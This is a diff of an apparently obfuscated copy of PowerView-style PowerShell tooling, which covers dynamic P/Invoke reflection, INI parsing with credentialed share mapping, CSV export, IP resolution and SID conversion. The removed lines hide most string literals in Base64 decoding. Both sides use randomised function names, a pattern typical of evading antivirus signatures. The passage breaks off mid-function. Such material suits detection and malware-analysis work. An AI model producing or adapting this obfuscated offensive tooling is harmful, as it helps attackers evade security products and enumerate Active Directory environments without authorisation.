@@ -1,4 +1,4 @@
-function jgrjya {
+function vzwvqh {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
@@ -10,18 +10,18 @@ function jgrjya {
         $ModuleName = [Guid]::NewGuid().ToString()
     )
 
-    $AppDomain = [Reflection.Assembly].Assembly.GetType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLkFwcERvbWFpbg==")))).GetProperty(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3VycmVudERvbWFpbg==")))).GetValue($null, @())
+    $AppDomain = [Reflection.Assembly].Assembly.GetType('System.AppDomain').GetProperty('CurrentDomain').GetValue($null, @())
     $LoadedAssemblies = $AppDomain.GetAssemblies()
 
     foreach ($Assembly in $LoadedAssemblies) {
-        if ($Assembly.FullName -and ($Assembly.FullName.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0] -eq $ModuleName)) {
+        if ($Assembly.FullName -and ($Assembly.FullName.Split(',')[0] -eq $ModuleName)) {
             return $Assembly
         }
     }
 
     $DynAssembly = New-Object Reflection.AssemblyName($ModuleName)
     $Domain = $AppDomain
-    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UnVu"))))
+    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, 'Run')
     $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule($ModuleName, $False)
 
     return $ModuleBuilder
@@ -30,7 +30,7 @@ function jgrjya {
 
 
 
-function mrrzbu {
+function hsvawt {
     Param (
         [Parameter(Position = 0, Mandatory = $True)]
         [String]
@@ -69,17 +69,17 @@ function mrrzbu {
         ReturnType = $ReturnType
     }
 
-    if ($ParameterTypes) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGFyYW1ldGVyVHlwZXM=")))] = $ParameterTypes }
-    if ($NativeCallingConvention) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TmF0aXZlQ2FsbGluZ0NvbnZlbnRpb24=")))] = $NativeCallingConvention }
-    if ($Charset) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhcnNldA==")))] = $Charset }
-    if ($SetLastError) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0TGFzdEVycm9y")))] = $SetLastError }
-    if ($EntryPoint) { $Properties[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW50cnlQb2ludA==")))] = $EntryPoint }
+    if ($ParameterTypes) { $Properties['ParameterTypes'] = $ParameterTypes }
+    if ($NativeCallingConvention) { $Properties['NativeCallingConvention'] = $NativeCallingConvention }
+    if ($Charset) { $Properties['Charset'] = $Charset }
+    if ($SetLastError) { $Properties['SetLastError'] = $SetLastError }
+    if ($EntryPoint) { $Properties['EntryPoint'] = $EntryPoint }
 
     New-Object PSObject -Property $Properties
 }
 
 
-function ilyssy
+function dpudje
 {
 
 
@@ -137,7 +137,7 @@ function ilyssy
         {
             if ($Namespace)
             {
-                $TypeHash[$DllName] = $Module.GetType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE5hbWVzcGFjZS4kRGxsTmFtZQ=="))))
+                $TypeHash[$DllName] = $Module.GetType("$Namespace.$DllName")
             }
             else
             {
@@ -151,17 +151,17 @@ function ilyssy
             {
                 if ($Namespace)
                 {
-                    $TypeHash[$DllName] = $Module.DefineType(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JE5hbWVzcGFjZS4kRGxsTmFtZQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLEJlZm9yZUZpZWxkSW5pdA=="))))
+                    $TypeHash[$DllName] = $Module.DefineType("$Namespace.$DllName", 'Public,BeforeFieldInit')
                 }
                 else
                 {
-                    $TypeHash[$DllName] = $Module.DefineType($DllName, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLEJlZm9yZUZpZWxkSW5pdA=="))))
+                    $TypeHash[$DllName] = $Module.DefineType($DllName, 'Public,BeforeFieldInit')
                 }
             }
 
             $Method = $TypeHash[$DllName].DefineMethod(
                 $FunctionName,
-                ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLFN0YXRpYyxQaW52b2tlSW1wbA=="))),
+                'Public,Static,PinvokeImpl',
                 $ReturnType,
                 $ParameterTypes)
 
@@ -171,20 +171,20 @@ function ilyssy
             {
                 if ($Parameter.IsByRef)
                 {
-                    [void] $Method.DefineParameter($i, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0"))), $null)
+                    [void] $Method.DefineParameter($i, 'Out', $null)
                 }
 
                 $i++
             }
 
             $DllImport = [Runtime.InteropServices.DllImportAttribute]
-            $SetLastErrorField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2V0TGFzdEVycm9y"))))
-            $CallingConventionField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2FsbGluZ0NvbnZlbnRpb24="))))
-            $CharsetField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q2hhclNldA=="))))
-            $EntryPointField = $DllImport.GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW50cnlQb2ludA=="))))
+            $SetLastErrorField = $DllImport.GetField('SetLastError')
+            $CallingConventionField = $DllImport.GetField('CallingConvention')
+            $CharsetField = $DllImport.GetField('CharSet')
+            $EntryPointField = $DllImport.GetField('EntryPoint')
             if ($SetLastError) { $SLEValue = $True } else { $SLEValue = $False }
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RW50cnlQb2ludA==")))]) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
+            if ($PSBoundParameters['EntryPoint']) { $ExportedFuncName = $EntryPoint } else { $ExportedFuncName = $FunctionName }
 
             
             $Constructor = [Runtime.InteropServices.DllImportAttribute].GetConstructor([String])
@@ -224,7 +224,7 @@ function ilyssy
 }
 
 
-function boiwqt {
+function twmjlt {
 
 
     [OutputType([Type])]
@@ -258,7 +258,7 @@ function boiwqt {
 
     $EnumType = $Type -as [Type]
 
-    $EnumBuilder = $Module.DefineEnum($FullName, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGlj"))), $EnumType)
+    $EnumBuilder = $Module.DefineEnum($FullName, 'Public', $EnumType)
 
     if ($Bitfield)
     {
@@ -279,7 +279,7 @@ function boiwqt {
 
 
 
-function amckbw {
+function dmfylr {
     Param (
         [Parameter(Position = 0, Mandatory=$True)]
         [UInt16]
@@ -306,7 +306,7 @@ function amckbw {
 }
 
 
-function dxxnvf
+function zxeulu
 {
 
 
@@ -338,7 +338,11 @@ function dxxnvf
         return ($Module.GetType($FullName))
     }
 
-    [Reflection.TypeAttributes] $StructAttributes = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QW5zaUNsYXNzLAogICAgICAgIENsYXNzLAogICAgICAgIFB1YmxpYywKICAgICAgICBTZWFsZWQsCiAgICAgICAgQmVmb3JlRmllbGRJbml0")))
+    [Reflection.TypeAttributes] $StructAttributes = 'AnsiClass,
+        Class,
+        Public,
+        Sealed,
+        BeforeFieldInit'
 
     if ($ExplicitLayout)
     {
@@ -351,7 +355,7 @@ function dxxnvf
 
     $StructBuilder = $Module.DefineType($FullName, $StructAttributes, [ValueType], $PackingSize)
     $ConstructorInfo = [Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]
-    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l6ZUNvbnN0")))))
+    $SizeConst = @([Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
 
     $Fields = New-Object Hashtable[]($StructFields.Count)
 
@@ -360,20 +364,20 @@ function dxxnvf
     
     foreach ($Field in $StructFields.Keys)
     {
-        $Index = $StructFields[$Field][([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG9zaXRpb24=")))]
+        $Index = $StructFields[$Field]['Position']
         $Fields[$Index] = @{FieldName = $Field; Properties = $StructFields[$Field]}
     }
 
     foreach ($Field in $Fields)
     {
-        $FieldName = $Field[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmllbGROYW1l")))]
-        $FieldProp = $Field[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]
+        $FieldName = $Field['FieldName']
+        $FieldProp = $Field['Properties']
 
-        $Offset = $FieldProp[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2Zmc2V0")))]
-        $Type = $FieldProp[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VHlwZQ==")))]
-        $MarshalAs = $FieldProp[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TWFyc2hhbEFz")))]
+        $Offset = $FieldProp['Offset']
+        $Type = $FieldProp['Type']
+        $MarshalAs = $FieldProp['MarshalAs']
 
-        $NewField = $StructBuilder.DefineField($FieldName, $Type, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGlj"))))
+        $NewField = $StructBuilder.DefineField($FieldName, $Type, 'Public')
 
         if ($MarshalAs)
         {
@@ -397,23 +401,23 @@ function dxxnvf
 
     
     
-    $SizeMethod = $StructBuilder.DefineMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0U2l6ZQ=="))),
-        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHVibGljLCBTdGF0aWM="))),
+    $SizeMethod = $StructBuilder.DefineMethod('GetSize',
+        'Public, Static',
         [Int],
         [Type[]] @())
     $ILGenerator = $SizeMethod.GetILGenerator()
     
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
-        [Type].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0VHlwZUZyb21IYW5kbGU=")))))
+        [Type].GetMethod('GetTypeFromHandle'))
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Call,
-        [Runtime.InteropServices.Marshal].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2l6ZU9m"))), [Type[]] @([Type])))
+        [Runtime.InteropServices.Marshal].GetMethod('SizeOf', [Type[]] @([Type])))
     $ILGenerator.Emit([Reflection.Emit.OpCodes]::Ret)
 
     
     
-    $ImplicitConverter = $StructBuilder.DefineMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b3BfSW1wbGljaXQ="))),
-        ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJpdmF0ZVNjb3BlLCBQdWJsaWMsIFN0YXRpYywgSGlkZUJ5U2lnLCBTcGVjaWFsTmFtZQ=="))),
+    $ImplicitConverter = $StructBuilder.DefineMethod('op_Implicit',
+        'PrivateScope, Public, Static, HideBySig, SpecialName',
         $StructBuilder,
         [Type[]] @([IntPtr]))
     $ILGenerator2 = $ImplicitConverter.GetILGenerator()
@@ -421,9 +425,9 @@ function dxxnvf
     $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldarg_0)
     $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ldtoken, $StructBuilder)
     $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
-        [Type].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2V0VHlwZUZyb21IYW5kbGU=")))))
+        [Type].GetMethod('GetTypeFromHandle'))
     $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Call,
-        [Runtime.InteropServices.Marshal].GetMethod(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHRyVG9TdHJ1Y3R1cmU="))), [Type[]] @([IntPtr], [Type])))
+        [Runtime.InteropServices.Marshal].GetMethod('PtrToStructure', [Type[]] @([IntPtr], [Type])))
     $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Unbox_Any, $StructBuilder)
     $ILGenerator2.Emit([Reflection.Emit.OpCodes]::Ret)
 
@@ -437,7 +441,7 @@ function dxxnvf
 
 
 
-Function dnsdja {
+Function inpqyn {
 
 
     [CmdletBinding(DefaultParameterSetName = 'DynamicParameter')]
@@ -474,7 +478,7 @@ Function dnsdja {
         [switch]$ValueFromRemainingArguments,
 
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
-        [string]$ParameterSetName = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("X19BbGxQYXJhbWV0ZXJTZXRz"))),
+        [string]$ParameterSetName = '__AllParameterSets',
 
         [Parameter(ValueFromPipelineByPropertyName = $true, ParameterSetName = 'DynamicParameter')]
         [switch]$AllowNull,
@@ -520,7 +524,7 @@ Function dnsdja {
         [ValidateScript({
             if(!($_ -is [System.Management.Automation.RuntimeDefinedParameterDictionary]))
             {
-                Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGljdGlvbmFyeSBtdXN0IGJlIGEgU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5SdW50aW1lRGVmaW5lZFBhcmFtZXRlckRpY3Rpb25hcnkgb2JqZWN0")))
+                Throw 'Dictionary must be a System.Management.Automation.RuntimeDefinedParameterDictionary object'
             }
             $true
         })]
@@ -534,8 +538,8 @@ Function dnsdja {
         [ValidateScript({
             
             
-            if($_.GetType().Name -notmatch ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGljdGlvbmFyeQ==")))) {
-                Throw ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Qm91bmRQYXJhbWV0ZXJzIG11c3QgYmUgYSBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQm91bmRQYXJhbWV0ZXJzRGljdGlvbmFyeSBvYmplY3Q=")))
+            if($_.GetType().Name -notmatch 'Dictionary') {
+                Throw 'BoundParameters must be a System.Management.Automation.PSBoundParametersDictionary object'
             }
             $true
         })]
@@ -544,8 +548,8 @@ Function dnsdja {
 
     Begin {
         $InternalDictionary = New-Object -TypeName System.Management.Automation.RuntimeDefinedParameterDictionary
-        function uardep { [CmdletBinding()] Param() }
-        $CommonParameters = (Get-Command uardep).Parameters.Keys
+        function pjvvqq { [CmdletBinding()] Param() }
+        $CommonParameters = (Get-Command pjvvqq).Parameters.Keys
     }
 
     Process {
@@ -561,7 +565,7 @@ Function dnsdja {
             $StaleKeys = @()
             $StaleKeys = $PSBoundParameters.GetEnumerator() |
                         ForEach-Object {
-                            if($_.Value.PSobject.Methods.Name -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkVxdWFscyQ=")))) {
+                            if($_.Value.PSobject.Methods.Name -match '^Equals$') {
                                 
                                 if(!$_.Value.Equals((Get-Variable -Name $_.Key -ValueOnly -Scope 0))) {
                                     $_.Key
@@ -606,9 +610,9 @@ Function dnsdja {
             $GetVar = {Get-Variable -Name $_ -ValueOnly -Scope 0}
 
             
-            $AttributeRegex = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XihNYW5kYXRvcnl8UG9zaXRpb258UGFyYW1ldGVyU2V0TmFtZXxEb250U2hvd3xIZWxwTWVzc2FnZXxWYWx1ZUZyb21QaXBlbGluZXxWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lfFZhbHVlRnJvbVJlbWFpbmluZ0FyZ3VtZW50cykk")))
-            $ValidationRegex = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XihBbGxvd051bGx8QWxsb3dFbXB0eVN0cmluZ3xBbGxvd0VtcHR5Q29sbGVjdGlvbnxWYWxpZGF0ZUNvdW50fFZhbGlkYXRlTGVuZ3RofFZhbGlkYXRlUGF0dGVybnxWYWxpZGF0ZVJhbmdlfFZhbGlkYXRlU2NyaXB0fFZhbGlkYXRlU2V0fFZhbGlkYXRlTm90TnVsbHxWYWxpZGF0ZU5vdE51bGxPckVtcHR5KSQ=")))
-            $AliasRegex = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XkFsaWFzJA==")))
+            $AttributeRegex = '^(Mandatory|Position|ParameterSetName|DontShow|HelpMessage|ValueFromPipeline|ValueFromPipelineByPropertyName|ValueFromRemainingArguments)$'
+            $ValidationRegex = '^(AllowNull|AllowEmptyString|AllowEmptyCollection|ValidateCount|ValidateLength|ValidatePattern|ValidateRange|ValidateScript|ValidateSet|ValidateNotNull|ValidateNotNullOrEmpty)$'
+            $AliasRegex = '^Alias$'
             $ParameterAttribute = New-Object -TypeName System.Management.Automation.ParameterAttribute
 
             switch -regex ($PSBoundParameters.Keys) {
@@ -631,7 +635,7 @@ Function dnsdja {
                 switch -regex ($PSBoundParameters.Keys) {
                     $ValidationRegex {
                         Try {
-                            $ParameterOptions = New-Object -TypeName ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi4ke199QXR0cmlidXRl"))) -ArgumentList (. $GetVar) -ErrorAction Stop
+                            $ParameterOptions = New-Object -TypeName "System.Management.Automation.${_}Attribute" -ArgumentList (. $GetVar) -ErrorAction Stop
                             $AttributeCollection.Add($ParameterOptions)
                         }
                         Catch { $_ }
@@ -661,7 +665,7 @@ Function dnsdja {
 }
 
 
-function dhbtba {
+function bbcezn {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -688,28 +692,28 @@ function dhbtba {
 
     PROCESS {
         ForEach ($TargetPath in $Path) {
-            if (($TargetPath -Match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XFxcXC4qXFwuKg==")))) -and ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))])) {
+            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                 $HostComputer = (New-Object System.Uri($TargetPath)).Host
                 if (-not $MappedComputers[$HostComputer]) {
                     
-                    jymmbe -ComputerName $HostComputer -Credential $Credential
+                    ehlhmp -ComputerName $HostComputer -Credential $Credential
                     $MappedComputers[$HostComputer] = $True
                 }
             }
 
             if (Test-Path -Path $TargetPath) {
-                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
+                if ($PSBoundParameters['OutputObject']) {
                     $IniObject = New-Object PSObject
                 }
                 else {
                     $IniObject = @{}
                 }
                 Switch -Regex -File $TargetPath {
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlxbKC4rKVxd"))) 
+                    "^\[(.+)\]" 
                     {
                         $Section = $matches[1].Trim()
-                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
-                            $Section = $Section.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IA=="))), '')
+                        if ($PSBoundParameters['OutputObject']) {
+                            $Section = $Section.Replace(' ', '')
                             $SectionObject = New-Object PSObject
                             $IniObject | Add-Member Noteproperty $Section $SectionObject
                         }
@@ -718,29 +722,29 @@ function dhbtba {
                         }
                         $CommentCount = 0
                     }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Xig7LiopJA=="))) 
+                    "^(;.*)$" 
                     {
                         $Value = $matches[1].Trim()
                         $CommentCount = $CommentCount + 1
-                        $Name = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tbWVudA=="))) + $CommentCount
-                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
-                            $Name = $Name.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IA=="))), '')
+                        $Name = 'Comment' + $CommentCount
+                        if ($PSBoundParameters['OutputObject']) {
+                            $Name = $Name.Replace(' ', '')
                             $IniObject.$Section | Add-Member Noteproperty $Name $Value
                         }
                         else {
                             $IniObject[$Section][$Name] = $Value
                         }
                     }
-                    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4rPylccyo9KC4qKQ=="))) 
+                    "(.+?)\s*=(.*)" 
                     {
                         $Name, $Value = $matches[1..2]
                         $Name = $Name.Trim()
-                        $Values = $Value.split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA==")))) | ForEach-Object { $_.Trim() }
+                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }
 
                         
 
-                        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T3V0cHV0T2JqZWN0")))]) {
-                            $Name = $Name.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("IA=="))), '')
+                        if ($PSBoundParameters['OutputObject']) {
+                            $Name = $Name.Replace(' ', '')
                             $IniObject.$Section | Add-Member Noteproperty $Name $Values
                         }
                         else {
@@ -755,12 +759,12 @@ function dhbtba {
 
     END {
         
-        $MappedComputers.Keys | erbqbk
+        $MappedComputers.Keys | oqraoh
     }
 }
 
 
-function vgmaks {
+function havzft {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -778,21 +782,21 @@ function vgmaks {
         [Parameter(Position = 2)]
         [ValidateNotNullOrEmpty()]
         [Char]
-        $Delimiter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),
+        $Delimiter = ',',
 
         [Switch]
         $Append
     )
 
     BEGIN {
-        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UGF0aA==")))])
+        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
         $Exists = [System.IO.File]::Exists($OutputPath)
 
         
-        $Mutex = New-Object System.Threading.Mutex $False,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q1NWTXV0ZXg=")))
+        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
         $Null = $Mutex.WaitOne()
 
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QXBwZW5k")))]) {
+        if ($PSBoundParameters['Append']) {
             $FileMode = [System.IO.FileMode]::Append
         }
         else {
@@ -829,7 +833,7 @@ function vgmaks {
 }
 
 
-function rcuisx {
+function rwxsjr {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -847,23 +851,23 @@ function rcuisx {
         ForEach ($Computer in $ComputerName) {
             try {
                 @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
-                    if ($_.AddressFamily -eq ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW50ZXJOZXR3b3Jr")))) {
+                    if ($_.AddressFamily -eq 'InterNetwork') {
                         $Out = New-Object PSObject
-                        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q29tcHV0ZXJOYW1l"))) $Computer
-                        $Out | Add-Member Noteproperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SVBBZGRyZXNz"))) $_.IPAddressToString
+                        $Out | Add-Member Noteproperty 'ComputerName' $Computer
+                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                         $Out
                     }
                 }
             }
             catch {
-                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1Jlc29sdmUtSVBBZGRyZXNzXSBDb3VsZCBub3QgcmVzb2x2ZSAkQ29tcHV0ZXIgdG8gYW4gSVAgQWRkcmVzcy4=")))
+                Write-Verbose "[Resolve-IPAddress] Could not resolve $Computer to an IP Address."
             }
         }
     }
 }
 
 
-function sgnhjq {
+function qszqvr {
 
 
     [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
@@ -891,43 +895,43 @@ function sgnhjq {
 
     BEGIN {
         $DomainSearcherArguments = @{}
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
-        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
+        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }
     }
 
     PROCESS {
         ForEach ($Object in $ObjectName) {
-            $Object = $Object -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lw=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA==")))
+            $Object = $Object -Replace '/','\'
 
-            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) {
-                $DN = vqxllx -Identity $Object -OutputType ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RE4="))) @DomainSearcherArguments
+            if ($PSBoundParameters['Credential']) {
+                $DN = jjxazw -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                 if ($DN) {
-                    $UserDomain = $DN.SubString($DN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
-                    $UserName = $DN.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))))[0].split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PQ=="))))[1]
+                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                    $UserName = $DN.Split(',')[0].split('=')[1]
 
-                    $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $UserName
-                    $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $UserDomain
-                    $DomainSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("b2JqZWN0c2lk")))
-                    kzvwpf @DomainSearcherArguments | Select-Object -Expand objectsid
+                    $DomainSearcherArguments['Identity'] = $UserName
+                    $DomainSearcherArguments['Domain'] = $UserDomain
+                    $DomainSearcherArguments['Properties'] = 'objectsid'
+                    guawbd @DomainSearcherArguments | Select-Object -Expand objectsid
                 }
             }
             else {
                 try {
-                    if ($Object.Contains(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))) {
-                        $Domain = $Object.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[0]
-                        $Object = $Object.Split(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XA=="))))[1]
+                    if ($Object.Contains('\')) {
+                        $Domain = $Object.Split('\')[0]
+                        $Object = $Object.Split('\')[1]
                     }
-                    elseif (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
+                    elseif (-not $PSBoundParameters['Domain']) {
                         $DomainSearcherArguments = @{}
-                        $Domain = (wjdyuo @DomainSearcherArguments).Name
+                        $Domain = (owdzhi @DomainSearcherArguments).Name
                     }
 
                     $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                     $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                 }
                 catch {
-                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0NvbnZlcnRUby1TSURdIEVycm9yIGNvbnZlcnRpbmcgJERvbWFpblwkT2JqZWN0IDogezB9"))) -f $_)
+                    Write-Verbose ("[ConvertTo-SID] Error converting $Domain\$Object : {0}" -f $_)
                 }
             }
         }
@@ -935,7 +939,7 @@ function sgnhjq {
 }
 
 
-function ylepkl {
+function rnmqfb {
 
 
     [OutputType([String])]
@@ -963,92 +967,92 @@ function ylepkl {
 
     BEGIN {
         $ADNameArguments = @{}
